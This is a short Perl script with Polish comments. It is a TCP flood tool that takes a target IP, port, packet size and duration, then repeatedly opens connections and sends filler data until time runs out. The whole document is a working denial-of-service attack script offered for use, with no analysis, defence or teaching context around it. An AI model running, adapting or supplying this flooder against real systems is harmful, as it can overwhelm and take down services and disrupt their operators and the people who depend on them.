#!/usr/bin/perl

use IO::Socket::INET;
use strict;

my ($ip, $port, $size, $time) = @ARGV;

$size = $size || 1024;      # domyślny rozmiar pakietu
$time = $time || 100;       # domyślny czas w sekundach
my $endtime = time() + $time;

print "TCP flood na $ip:$port przez $time sekund, pakiet: $size bajtów\n";

for (; time() <= $endtime; ) {
    my $sock = IO::Socket::INET->new(
        PeerAddr => $ip,
        PeerPort => $port,
        Proto    => 'tcp',
        Timeout  => 1
    );
    if ($sock) {
        print $sock 'A' x $size;
        close($sock);
    }
}
print "Koniec!\n";
